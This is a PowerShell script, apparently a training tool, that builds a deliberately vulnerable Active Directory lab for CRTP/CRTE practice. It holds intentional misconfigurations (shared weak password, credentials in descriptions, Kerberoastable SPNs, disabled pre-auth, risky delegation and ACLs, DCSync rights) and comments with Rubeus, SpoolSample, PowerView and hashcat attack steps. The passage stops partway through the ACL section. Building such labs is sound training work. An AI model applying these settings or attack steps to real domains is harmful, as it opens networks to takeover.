#Requires -RunAsAdministrator
#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    AD Enumeration & Attacks Lab - corp.local Forest Root
    Covers: CRTP + CRTE attack paths

.DESCRIPTION
    Full setup for corp.local. Attack coverage:
      - Kerberoasting, AS-REP Roasting, Golden/Silver Ticket
      - Unconstrained / Constrained / Resource-Based Constrained Delegation
      - ACL attacks: GenericAll, GenericWrite, WriteDACL, WriteOwner,
                     DCSync, ForceChangePassword, AddMember, Shadow Credentials
      - ADCS: ESC1 - ESC8
      - AdminSDHolder, DSRM, GPP/SYSVOL passwords, MachineAccountQuota
      - AlwaysInstallElevated via GPO

.ENVIRONMENT
    DC-01  : corp.local  (this machine, also runs CA)
    DC-02  : dev.corp.local  (child domain - see Setup-DevCorpLocal.ps1)
    WS-01  : Windows 10/11 attacker workstation

.HOW TO RUN
    On DC-01 as Administrator:
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
        .\Setup-CorpLocal.ps1

.WARNING
    INTERNAL LAB ONLY. Intentional misconfigurations present.
    Never connect to production networks.
#>

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

#region SECTION 0 - Global Configuration
# -----------------------------------------------------------------------------

$DomainDN   = "DC=corp,DC=local"
$DomainFQDN = "corp.local"
$DCHostname = $env:COMPUTERNAME

# Single lab password for every account - easy to remember during training
$LabPassword = ConvertTo-SecureString "p@ssw0rd" -AsPlainText -Force

Write-Host "`n[*] AD Lab Setup - corp.local - DC: $DCHostname" -ForegroundColor Cyan
Write-Host "[*] Domain DN : $DomainDN`n" -ForegroundColor Cyan

#endregion

#region SECTION 1 - Helper Functions
# -----------------------------------------------------------------------------

function New-OUSafe {
    param([string]$Name, [string]$Path)
    $dn = "OU=$Name,$Path"
    if (-not (Get-ADOrganizationalUnit -Filter "DistinguishedName -eq '$dn'" -ErrorAction SilentlyContinue)) {
        New-ADOrganizationalUnit -Name $Name -Path $Path -ProtectedFromAccidentalDeletion $false
        Write-Host "  [+] OU : $dn" -ForegroundColor Green
    } else {
        Write-Host "  [~] OU exists : $dn" -ForegroundColor Yellow
    }
    return $dn
}

function New-ADUserSafe {
    param([hashtable]$P)
    $sam = $P["SamAccountName"]
    if (-not (Get-ADUser -Filter "SamAccountName -eq '$sam'" -ErrorAction SilentlyContinue)) {
        New-ADUser @P
        Write-Host "  [+] User : $sam" -ForegroundColor Green
    } else {
        Write-Host "  [~] User exists : $sam" -ForegroundColor Yellow
    }
}

function New-ADGroupSafe {
    param([string]$Name, [string]$Path, [string]$Desc = "")
    if (-not (Get-ADGroup -Filter "Name -eq '$Name'" -ErrorAction SilentlyContinue)) {
        New-ADGroup -Name $Name -GroupScope Global -GroupCategory Security -Path $Path -Description $Desc
        Write-Host "  [+] Group : $Name" -ForegroundColor Green
    } else {
        Write-Host "  [~] Group exists : $Name" -ForegroundColor Yellow
    }
}

function Add-MemberSafe {
    param([string]$Group, [string]$Member)
    try {
        Add-ADGroupMember -Identity $Group -Members $Member -ErrorAction Stop
        Write-Host "  [+] $Member -> $Group" -ForegroundColor Green
    } catch {
        if ($_.Exception.Message -like "*already a member*") {
            Write-Host "  [~] $Member already in $Group" -ForegroundColor Yellow
        } else {
            Write-Host "  [!] $Member -> $Group failed: $_" -ForegroundColor Red
        }
    }
}

function Set-ADACE {
    <#
    Generic ACE setter. RightsType examples:
      GenericAll, GenericWrite, WriteDacl, WriteOwner, ExtendedRight
    ObjectGUID: GUID of specific right (leave $null for object-level rights)
    #>
    param(
        [string]$TargetDN,
        [string]$PrincipalSam,
        [System.DirectoryServices.ActiveDirectoryRights]$Rights,
        [System.Security.AccessControl.AccessControlType]$AccessType = "Allow",
        [System.DirectoryServices.ActiveDirectorySecurityInheritance]$Inheritance = "None",
        [GUID]$RightGUID    = [GUID]::Empty,
        [GUID]$ObjectTypeGUID = [GUID]::Empty
    )
    try {
        # Resolve principal (user or group)
        $obj = Get-ADUser -Filter "SamAccountName -eq '$PrincipalSam'" -ErrorAction SilentlyContinue
        if (-not $obj) {
            $obj = Get-ADGroup -Filter "Name -eq '$PrincipalSam'" -ErrorAction SilentlyContinue
        }
        if (-not $obj) { throw "Principal '$PrincipalSam' not found" }

        $sid = [System.Security.Principal.SecurityIdentifier]$obj.SID
        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid, $Rights, $AccessType, $RightGUID, $Inheritance, $ObjectTypeGUID
        )
        $path = "AD:\$TargetDN"
        $acl  = Get-Acl $path
        $acl.AddAccessRule($ace)
        Set-Acl $path $acl
        Write-Host "  [+] ACE set: $PrincipalSam -> $Rights on $TargetDN" -ForegroundColor Green
    } catch {
        Write-Host "  [!] ACE failed ($PrincipalSam -> $TargetDN): $_" -ForegroundColor Red
    }
}

function Set-DCSyncRights {
    param([string]$PrincipalSam)
    # DS-Replication-Get-Changes      = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
    # DS-Replication-Get-Changes-All  = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
    foreach ($guid in @("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2","1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")) {
        Set-ADACE -TargetDN $DomainDN -PrincipalSam $PrincipalSam `
                  -Rights ExtendedRight -RightGUID ([GUID]$guid) `
                  -Inheritance None
    }
    Write-Host "  [!] DCSync rights granted to $PrincipalSam" -ForegroundColor Yellow
}

function Set-ForceChangePassword {
    param([string]$GranteeSam, [string]$TargetSam)
    $targetUser = Get-ADUser -Identity $TargetSam
    # User-Force-Change-Password = 00299570-246d-11d0-a768-00aa006e0529
    Set-ADACE -TargetDN $targetUser.DistinguishedName -PrincipalSam $GranteeSam `
              -Rights ExtendedRight `
              -RightGUID ([GUID]"00299570-246d-11d0-a768-00aa006e0529") `
              -Inheritance None
}

function New-VulnerableCertTemplate {
    <#
    Creates a vulnerable PKI certificate template by copying the built-in
    "User" template and overriding specific security-relevant attributes.
    #>
    param(
        [string]$TemplateName,
        [string]$DisplayName,
        [int]$NameFlag,       # msPKI-Certificate-Name-Flag
        [int]$EnrollFlag,     # msPKI-Enrollment-Flag
        [string[]]$EKUs,      # pKIExtendedKeyUsage OIDs
        [bool]$LowPrivEnroll = $true,
        [string]$SourceTemplate = "User"
    )

    $configNC   = (Get-ADRootDSE).configurationNamingContext
    $tmplCont   = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
    $newDN      = "CN=$TemplateName,$tmplCont"

    if (Get-ADObject -Filter "DistinguishedName -eq '$newDN'" -ErrorAction SilentlyContinue) {
        Write-Host "  [~] Template exists: $TemplateName" -ForegroundColor Yellow
        return
    }

    $src = Get-ADObject -SearchBase $tmplCont -Filter "Name -eq '$SourceTemplate'" `
                        -Properties * -ErrorAction SilentlyContinue
    if (-not $src) {
        Write-Host "  [!] Source template '$SourceTemplate' not found. Is ADCS installed?" -ForegroundColor Red
        return
    }

    $skip = @('DistinguishedName','ObjectGUID','WhenCreated','WhenChanged','ObjectClass',
              'CN','Name','CanonicalName','ObjectCategory','nTSecurityDescriptor',
              'uSNChanged','uSNCreated','instanceType','dSCorePropagationData')

    $attrs = @{}
    foreach ($p in $src.PSObject.Properties.Name) {
        if ($p -in $skip) { continue }
        $v = $src.$p
        if ($null -eq $v) { continue }
        if ($v -is [System.Collections.ICollection] -and $v.Count -eq 0) { continue }
        $attrs[$p] = $v
    }

    $oid1 = Get-Random -Minimum 100000000 -Maximum 999999999
    $oid2 = Get-Random -Minimum 100000000 -Maximum 999999999

    $attrs['displayName']                    = $DisplayName
    $attrs['msPKI-Cert-Template-OID']        = "1.3.6.1.4.1.311.21.8.$oid1.$oid2"
    $attrs['msPKI-Certificate-Name-Flag']    = [int]$NameFlag
    $attrs['msPKI-Enrollment-Flag']          = [int]$EnrollFlag
    $attrs['msPKI-RA-Signature']             = 0
    $attrs['revision']                       = 100
    $attrs['msPKI-Template-Minor-Revision']  = 1
    if ($EKUs) { $attrs['pKIExtendedKeyUsage'] = $EKUs }

    try {
        New-ADObject -Name $TemplateName -Type pKICertificateTemplate -Path $tmplCont -OtherAttributes $attrs
        Write-Host "  [+] Template created: $TemplateName" -ForegroundColor Green
    } catch {
        Write-Host "  [!] Template creation failed ($TemplateName): $_" -ForegroundColor Red
        return
    }

    if ($LowPrivEnroll) {
        try {
            $sid        = [System.Security.Principal.SecurityIdentifier](Get-ADGroup "Domain Users").SID
            $enrollGUID = [GUID]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $sid,
                [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                [System.Security.AccessControl.AccessControlType]::Allow,
                $enrollGUID,
                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None,
                [GUID]::Empty
            )
            $acl = Get-Acl "AD:\$newDN"
            $acl.AddAccessRule($ace)
            Set-Acl "AD:\$newDN" $acl
            Write-Host "  [+] Domain Users enroll ACE added on $TemplateName" -ForegroundColor Green
        } catch {
            Write-Host "  [!] Enroll ACE failed on $TemplateName : $_" -ForegroundColor Red
        }
    }
}

#endregion

#region SECTION 2 - Organisational Units
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 2] Creating OUs" -ForegroundColor Magenta

$OU_IT      = New-OUSafe "IT"               $DomainDN
$OU_HR      = New-OUSafe "HR"               $DomainDN
$OU_Finance = New-OUSafe "Finance"          $DomainDN
$OU_Sales   = New-OUSafe "Sales"            $DomainDN
$OU_Dev     = New-OUSafe "Development"      $DomainDN
$OU_Mgmt    = New-OUSafe "Management"       $DomainDN
$OU_Ops     = New-OUSafe "Operations"       $DomainDN
$OU_Sec     = New-OUSafe "Security"         $DomainDN
$OU_SRV     = New-OUSafe "Servers"          $DomainDN
$OU_WS      = New-OUSafe "Workstations"     $DomainDN
$OU_SVC     = New-OUSafe "ServiceAccounts"  $DomainDN
$OU_Stage   = New-OUSafe "Staging"          $DomainDN
$OU_Dis     = New-OUSafe "DisabledUsers"    $DomainDN

#endregion

#region SECTION 3 - Security Groups
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 3] Creating Groups" -ForegroundColor Magenta

New-ADGroupSafe "IT Admins"           $OU_IT    "IT administrators"
New-ADGroupSafe "Helpdesk"            $OU_IT    "Helpdesk - can reset passwords"
New-ADGroupSafe "HR Users"            $OU_HR    "Human Resources staff"
New-ADGroupSafe "Finance Users"       $OU_Finance "Finance department"
New-ADGroupSafe "Dev Team"            $OU_Dev   "Developers"
New-ADGroupSafe "Dev Leads"           $OU_Dev   "Development team leads"
New-ADGroupSafe "Contractors"         $OU_Stage "External contractors"
New-ADGroupSafe "Remote Workers"      $DomainDN "Remote access users"
New-ADGroupSafe "SQL Admins"          $OU_SVC   "SQL Server admins"
New-ADGroupSafe "Backup Operators Team" $OU_SVC "Backup operators"
New-ADGroupSafe "Key Admins Team"     $OU_Sec   "Key/secrets admins"
New-ADGroupSafe "Certificate Managers Team" $OU_Sec "Certificate managers"
New-ADGroupSafe "VPN Users"           $DomainDN "VPN access"

#endregion

#region SECTION 4 - IT Department Users
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 4] Creating IT Users" -ForegroundColor Magenta

New-ADUserSafe @{
    SamAccountName    = "ahmad.ali"
    Name              = "Ahmad Ali"
    GivenName         = "Ahmad"; Surname = "Ali"
    UserPrincipalName = "ahmad.ali@$DomainFQDN"
    Path              = $OU_IT
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "Senior IT Administrator - manages DC backup jobs"
}

New-ADUserSafe @{
    SamAccountName    = "fahad.salem"
    Name              = "Fahad Salem"
    GivenName         = "Fahad"; Surname = "Salem"
    UserPrincipalName = "fahad.salem@$DomainFQDN"
    Path              = $OU_IT
    AccountPassword   = $LabPassword
    Enabled           = $true
    # MISCONFIGURATION: password never expires
    PasswordNeverExpires = $true
    Description       = "Helpdesk Lead - temporary Domain Admin rights since 2022"
}

New-ADUserSafe @{
    SamAccountName    = "khalid.nasser"
    Name              = "Khalid Nasser"
    GivenName         = "Khalid"; Surname = "Nasser"
    UserPrincipalName = "khalid.nasser@$DomainFQDN"
    Path              = $OU_IT
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    # MISCONFIGURATION: password hint in description
    Description       = "Helpdesk junior. Default pass: p@ssw0rd - ask IT to change on first login"
}

New-ADUserSafe @{
    SamAccountName    = "noura.ahmed"
    Name              = "Noura Ahmed"
    GivenName         = "Noura"; Surname = "Ahmed"
    UserPrincipalName = "noura.ahmed@$DomainFQDN"
    Path              = $OU_IT
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "Security Analyst - flag{it_enum_noura_crtp}"
}

#endregion

#region SECTION 5 - HR Department Users
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 5] Creating HR Users" -ForegroundColor Magenta

New-ADUserSafe @{
    SamAccountName    = "sara.khalid"
    Name              = "Sara Khalid"
    GivenName         = "Sara"; Surname = "Khalid"
    UserPrincipalName = "sara.khalid@$DomainFQDN"
    Path              = $OU_HR
    AccountPassword   = $LabPassword
    Enabled           = $true
    # MISCONFIGURATION: PwdNeverExpires + juicy description
    PasswordNeverExpires = $true
    Description       = "HR Manager. Payroll share: \\DC-01\Payroll - password same as AD"
}

New-ADUserSafe @{
    SamAccountName    = "maryam.hassan"
    Name              = "Maryam Hassan"
    GivenName         = "Maryam"; Surname = "Hassan"
    UserPrincipalName = "maryam.hassan@$DomainFQDN"
    Path              = $OU_HR
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "HR Coordinator"
}

New-ADUserSafe @{
    SamAccountName    = "reem.sultan"
    Name              = "Reem Sultan"
    GivenName         = "Reem"; Surname = "Sultan"
    UserPrincipalName = "reem.sultan@$DomainFQDN"
    Path              = $OU_HR
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    # FAKE FLAG in description
    Description       = "HR Assistant - flag{hr_description_enum_crtp}"
}

New-ADUserSafe @{
    SamAccountName    = "hessa.jaber"
    Name              = "Hessa Jaber"
    GivenName         = "Hessa"; Surname = "Jaber"
    UserPrincipalName = "hessa.jaber@$DomainFQDN"
    Path              = $OU_HR
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "HR Staff"
}

#endregion

#region SECTION 6 - Finance Department Users
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 6] Creating Finance Users" -ForegroundColor Magenta

New-ADUserSafe @{
    SamAccountName    = "faisal.omar"
    Name              = "Faisal Omar"
    GivenName         = "Faisal"; Surname = "Omar"
    UserPrincipalName = "faisal.omar@$DomainFQDN"
    Path              = $OU_Finance
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true   # MISCONFIGURATION
    Description       = "Finance Director - SAP admin access. VPN PIN: 7734"
}

New-ADUserSafe @{
    SamAccountName    = "dana.rashid"
    Name              = "Dana Rashid"
    GivenName         = "Dana"; Surname = "Rashid"
    UserPrincipalName = "dana.rashid@$DomainFQDN"
    Path              = $OU_Finance
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "Accounts Payable"
}

# AS-REP Roastable #1
New-ADUserSafe @{
    SamAccountName    = "walid.saeed"
    Name              = "Walid Saeed"
    GivenName         = "Walid"; Surname = "Saeed"
    UserPrincipalName = "walid.saeed@$DomainFQDN"
    Path              = $OU_Finance
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "Finance Analyst - flag{asrep_walid_crtp}"
}

New-ADUserSafe @{
    SamAccountName    = "nada.mubarak"
    Name              = "Nada Mubarak"
    GivenName         = "Nada"; Surname = "Mubarak"
    UserPrincipalName = "nada.mubarak@$DomainFQDN"
    Path              = $OU_Finance
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "Finance staff"
}

#endregion

#region SECTION 7 - Development Department Users
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 7] Creating Dev Users" -ForegroundColor Magenta

New-ADUserSafe @{
    SamAccountName    = "tariq.dev"
    Name              = "Tariq Dev"
    GivenName         = "Tariq"; Surname = "Dev"
    UserPrincipalName = "tariq.dev@$DomainFQDN"
    Path              = $OU_Dev
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "Dev Lead - has write access to WEB-SRV-02 for deployments"
}

New-ADUserSafe @{
    SamAccountName    = "omar.coder"
    Name              = "Omar Coder"
    GivenName         = "Omar"; Surname = "Coder"
    UserPrincipalName = "omar.coder@$DomainFQDN"
    Path              = $OU_Dev
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "Developer - flag{dev_enum_omar}"
}

# AS-REP Roastable #2
New-ADUserSafe @{
    SamAccountName    = "lina.script"
    Name              = "Lina Script"
    GivenName         = "Lina"; Surname = "Script"
    UserPrincipalName = "lina.script@$DomainFQDN"
    Path              = $OU_Dev
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "DevOps Engineer - flag{asrep_lina_crtp}"
}

New-ADUserSafe @{
    SamAccountName    = "nasser.web"
    Name              = "Nasser Web"
    GivenName         = "Nasser"; Surname = "Web"
    UserPrincipalName = "nasser.web@$DomainFQDN"
    Path              = $OU_Dev
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "Web Developer"
}

#endregion

#region SECTION 8 - Management + Staging Users
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 8] Creating Management & Staging Users" -ForegroundColor Magenta

New-ADUserSafe @{
    SamAccountName    = "hamad.ceo"
    Name              = "Hamad CEO"
    GivenName         = "Hamad"; Surname = "CEO"
    UserPrincipalName = "hamad.ceo@$DomainFQDN"
    Path              = $OU_Mgmt
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    # Juicy description for LDAP recon
    Description       = "CEO. KeePass master at \\DC-01\IT\corp.kdbx - key: p@ssw0rd"
}

New-ADUserSafe @{
    SamAccountName    = "abdulaziz.cfo"
    Name              = "Abdulaziz CFO"
    GivenName         = "Abdulaziz"; Surname = "CFO"
    UserPrincipalName = "abdulaziz.cfo@$DomainFQDN"
    Path              = $OU_Mgmt
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "CFO - finance system admin credentials in LastPass vault"
}

# AS-REP Roastable #3 - contractor in staging
New-ADUserSafe @{
    SamAccountName    = "contractor.mutaeb"
    Name              = "Contractor Mutaeb"
    GivenName         = "Contractor"; Surname = "Mutaeb"
    UserPrincipalName = "contractor.mutaeb@$DomainFQDN"
    Path              = $OU_Stage
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "External contractor - no pre-auth configured by mistake - flag{asrep_contractor_crtp}"
}

New-ADUserSafe @{
    SamAccountName    = "attacker.01"
    Name              = "Attacker 01"
    GivenName         = "Attacker"; Surname = "01"
    UserPrincipalName = "attacker.01@$DomainFQDN"
    Path              = $DomainDN
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "Lab trainee account - low privilege starting point"
}

#endregion

#region SECTION 9 - Service Accounts (Kerberoasting targets)
# -----------------------------------------------------------------------------
# ATTACK: Any authenticated user can request a TGS for accounts with SPNs,
#         then crack the ticket offline.
# Tool  : Invoke-Kerberoast / Rubeus kerberoast / impacket GetUserSPNs.py
# Crack : hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 9] Creating Service Accounts (Kerberoasting)" -ForegroundColor Magenta

$svcAccounts = @(
    @{ Sam="svc_sql";      Desc="SQL Server svc - flag{kerberoast_svc_sql_crtp}" },
    @{ Sam="svc_iis";      Desc="IIS App Pool identity" },
    @{ Sam="svc_mssql";    Desc="MSSQL reporting service" },
    @{ Sam="svc_exchange";  Desc="Exchange mail relay service" },
    @{ Sam="svc_web";      Desc="Web application service - unconstrained delegation host" },
    @{ Sam="svc_backup";   Desc="Backup agent - created 2019 - flag{kerberoast_backup_crte}" }
)

foreach ($svc in $svcAccounts) {
    New-ADUserSafe @{
        SamAccountName    = $svc.Sam
        Name              = $svc.Sam
        UserPrincipalName = "$($svc.Sam)@$DomainFQDN"
        Path              = $OU_SVC
        AccountPassword   = $LabPassword
        Enabled           = $true
        PasswordNeverExpires = $true   # MISCONFIGURATION
        Description       = $svc.Desc
    }
}

# Register SPNs - makes accounts Kerberoastable
Write-Host "`n  [*] Registering SPNs..." -ForegroundColor Cyan
$spns = @(
    @{ Sam="svc_sql";     SPN="MSSQLSvc/$DCHostname.$DomainFQDN:1433" },
    @{ Sam="svc_iis";     SPN="HTTP/WEB-SRV-01.$DomainFQDN" },
    @{ Sam="svc_mssql";   SPN="MSSQLSvc/SQL-SRV-01.$DomainFQDN:1433" },
    @{ Sam="svc_exchange"; SPN="SMTP/MAIL-SRV-01.$DomainFQDN" },
    @{ Sam="svc_web";     SPN="HTTP/WEB-SRV-02.$DomainFQDN:8080" },
    @{ Sam="svc_backup";  SPN="BackupAgent/$DCHostname.$DomainFQDN" }
)
foreach ($s in $spns) {
    $existing = & setspn -L $s.Sam 2>&1
    if ($existing -notmatch [regex]::Escape($s.SPN)) {
        & setspn -S $s.SPN $s.Sam | Out-Null
        Write-Host "  [+] SPN: $($s.SPN) -> $($s.Sam)" -ForegroundColor Green
    } else {
        Write-Host "  [~] SPN exists: $($s.SPN)" -ForegroundColor Yellow
    }
}

#endregion

#region SECTION 10 - AS-REP Roastable Users
# -----------------------------------------------------------------------------
# ATTACK: Accounts with Kerberos pre-auth disabled return an AS-REP blob
#         without requiring any password. The blob can be cracked offline.
# Tool  : Rubeus asreproast / impacket GetNPUsers.py
# Crack : hashcat -m 18200 hashes.txt rockyou.txt
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 10] Configuring AS-REP Roastable Users" -ForegroundColor Magenta

foreach ($sam in @("walid.saeed","lina.script","contractor.mutaeb")) {
    try {
        Set-ADAccountControl -Identity $sam -DoesNotRequirePreAuth $true
        Write-Host "  [+] AS-REP roastable: $sam" -ForegroundColor Green
    } catch {
        Write-Host "  [!] Failed for $sam : $_" -ForegroundColor Red
    }
}

#endregion

#region SECTION 11 - Computer Objects
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 11] Creating Computer Objects" -ForegroundColor Magenta

$computers = @(
    @{ Name="WEB-SRV-01"; OU=$OU_SRV; Desc="Web server - unconstrained delegation" },
    @{ Name="WEB-SRV-02"; OU=$OU_SRV; Desc="Web server - RBCD target" },
    @{ Name="SQL-SRV-01"; OU=$OU_SRV; Desc="SQL server - constrained delegation target" }
)
foreach ($c in $computers) {
    if (-not (Get-ADComputer -Filter "Name -eq '$($c.Name)'" -ErrorAction SilentlyContinue)) {
        New-ADComputer -Name $c.Name -Path $c.OU -Description $c.Desc
        Write-Host "  [+] Computer: $($c.Name)" -ForegroundColor Green
    } else {
        Write-Host "  [~] Computer exists: $($c.Name)" -ForegroundColor Yellow
    }
}

#endregion

#region SECTION 12 - Delegation Misconfigurations
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 12] Configuring Delegation Attacks" -ForegroundColor Magenta

# --- 12a: UNCONSTRAINED DELEGATION ---
# ATTACK: Compromise WEB-SRV-01 or svc_web.
#   Option A: Rubeus monitor /interval:5 /nowrap -> wait for any user to authenticate
#             -> capture TGT -> Rubeus ptt -> impersonate that user
#   Option B: PrinterBug / PetitPotam to coerce DC-01$ to authenticate to WEB-SRV-01
#             -> capture DC-01$ TGT -> DCSync -> dump krbtgt hash -> Golden Ticket
# Tool: Rubeus.exe monitor /interval:5 | SpoolSample.exe DC-01 WEB-SRV-01
Write-Host "  [*] Unconstrained Delegation..." -ForegroundColor Cyan
try {
    Set-ADComputer -Identity "WEB-SRV-01" -TrustedForDelegation $true
    Set-ADUser     -Identity "svc_web"    -TrustedForDelegation $true
    Write-Host "  [+] Unconstrained Delegation: WEB-SRV-01, svc_web" -ForegroundColor Green
} catch { Write-Host "  [!] Unconstrained delegation: $_" -ForegroundColor Red }

# --- 12b: CONSTRAINED DELEGATION WITH PROTOCOL TRANSITION (S4U2Self + S4U2Proxy) ---
# ATTACK: Get NTLM hash of svc_iis (Kerberoast it).
#   Rubeus s4u /user:svc_iis /rc4:<hash> /impersonateuser:Administrator
#             /msdsspn:"CIFS/DC-01.corp.local" /ptt
#   -> Access DC-01 CIFS share as Administrator
# Note: TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION flag = protocol transition enabled
Write-Host "  [*] Constrained Delegation (Protocol Transition)..." -ForegroundColor Cyan
try {
    Set-ADUser -Identity "svc_iis" `
               -Add @{'msDS-AllowedToDelegateTo' = @("CIFS/$DCHostname.$DomainFQDN","CIFS/$DCHostname")}
    Set-ADAccountControl -Identity "svc_iis" -TrustedToAuthForDelegation $true
    Write-Host "  [+] Constrained+ProtocolTransition: svc_iis -> CIFS/$DCHostname" -ForegroundColor Green
} catch { Write-Host "  [!] Constrained delegation (svc_iis): $_" -ForegroundColor Red }

# --- 12c: CONSTRAINED DELEGATION WITHOUT PROTOCOL TRANSITION ---
# ATTACK: Need a TGT for svc_mssql (get via Kerberoast).
#   Rubeus s4u /ticket:<base64TGT> /impersonateuser:Administrator
#             /msdsspn:"MSSQLSvc/SQL-SRV-01.corp.local:1433" /ptt
#   -> Connect to SQL-SRV-01 as Administrator
Write-Host "  [*] Constrained Delegation (no Protocol Transition)..." -ForegroundColor Cyan
try {
    Set-ADUser -Identity "svc_mssql" `
               -Add @{'msDS-AllowedToDelegateTo' = @("MSSQLSvc/SQL-SRV-01.$DomainFQDN:1433")}
    Write-Host "  [+] Constrained (no PT): svc_mssql -> MSSQLSvc/SQL-SRV-01" -ForegroundColor Green
} catch { Write-Host "  [!] Constrained delegation (svc_mssql): $_" -ForegroundColor Red }

# --- 12d: RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) ---
# MISCONFIGURATION: tariq.dev has GenericWrite on WEB-SRV-02 computer object.
# ATTACK:
#   1. Compromise tariq.dev
#   2. Create a new machine account: New-MachineAccount -MachineAccount "AttackerPC" -Password p@ssw0rd
#   3. Get SID of AttackerPC
#   4. Set msDS-AllowedToActOnBehalfOfOtherIdentity on WEB-SRV-02 to allow AttackerPC
#      Set-ADComputer WEB-SRV-02 -PrincipalsAllowedToDelegateToAccount AttackerPC$
#   5. Rubeus s4u /user:AttackerPC$ /rc4:<hash> /impersonateuser:Administrator
#               /msdsspn:"CIFS/WEB-SRV-02.corp.local" /ptt
# Tool: PowerMad (New-MachineAccount) + Rubeus
Write-Host "  [*] RBCD - GenericWrite on WEB-SRV-02 for tariq.dev..." -ForegroundColor Cyan
$wss2 = (Get-ADComputer "WEB-SRV-02").DistinguishedName
Set-ADACE -TargetDN $wss2 -PrincipalSam "tariq.dev" `
          -Rights ([System.DirectoryServices.ActiveDirectoryRights]::GenericWrite) `
          -Inheritance None

#endregion

#region SECTION 13 - ACL Misconfigurations
# -----------------------------------------------------------------------------
Write-Host "`n[SECTION 13] Configuring ACL Attacks" -ForegroundColor Magenta

# --- 13a: GenericAll on user ---
# jenny.walsh (noura.ahmed) has GenericAll on faisal.omar.
# ATTACK: Reset password, targeted Kerberoasting (set SPN), shadow credentials
# Tool: PowerView Set-DomainUserPassword / Add-DomainObjectAcl
Write-Host "  [*] GenericAll: noura.ahmed -> faisal.omar" -ForegroundColor Cyan
Set-ADACE -TargetDN (Get-ADUser "faisal.omar").DistinguishedName `
          -PrincipalSam "noura.ahmed" `
          -Rights ([System.DirectoryServices.ActiveDirectoryRights]::GenericAll) `
          -Inheritance None

# --- 13b: GenericWrite on user (Targeted Kerberoasting) ---
# khalid.nasser (Helpdesk) has GenericWrite on svc_sql.
# ATTACK: Set arbitrary SPN on svc_sql -> Request TGS -> Crack offline
# Tool: PowerView Set-DomainObject -Set @{serviceprincipalname='fake/spn'} then Invoke-Kerberoast
Write-Host "  [*] GenericWrite (Targeted Kerberoast): khalid.nasser -> svc_sql" -ForegroundColor Cyan
Set-ADACE -TargetDN (Get-ADUser "svc_sql").DistinguishedName `
          -PrincipalSam "khalid.nasser" `
          -Rights ([System.DirectoryServices.ActiveDirectoryRights]::GenericWrite) `
          -Inheritance None

# --- 13c: WriteDACL on group ---
# ahmad.ali has WriteDACL on Finance Users group.
# ATTACK: Modify group DACL to grant self GenericAll -> Add self to Finance Users
# Tool: PowerView Add-DomainObjectAcl -TargetIdentity "Finance Users" -PrincipalIdentity ahmad.ali -Rights All
Write-Host "  [*] WriteDACL: ahmad.ali -> Finance Users group" -ForegroundColor Cyan
Set-ADACE -TargetDN (Get-ADGroup "Finance Users").DistinguishedName `
          -PrincipalSam "ahmad.ali" `
          -Rights ([System.DirectoryServices.ActiveDirectoryRights]::WriteDacl) `
          -Inheritance None

# --- 13d: WriteOwner on privileged group ---
# Helpdesk group has WriteOwner on IT Admins group.
# ATTACK: Any Helpdesk member takes ownership of IT Admins -> grants WriteDACL
#         -> grants GenericAll -> adds self to IT Admins
# Tool: PowerView Set-DomainObjectOwner then Add-DomainObjectAcl
Write-Host "  [*] WriteOwner: Helpdesk -> IT Admins group" -ForegroundColor Cyan
Set-ADACE -TargetDN (Get-ADGroup "IT Admins").DistinguishedName `
          -PrincipalSam "Helpdesk" `
          -Rights ([System.DirectoryServices.ActiveDirectoryRights]::WriteOwner) `
          -Inheritance None

# --- 13e: DCSync Rights ---
# svc_backup has DS-Replication rights on the domain NC.
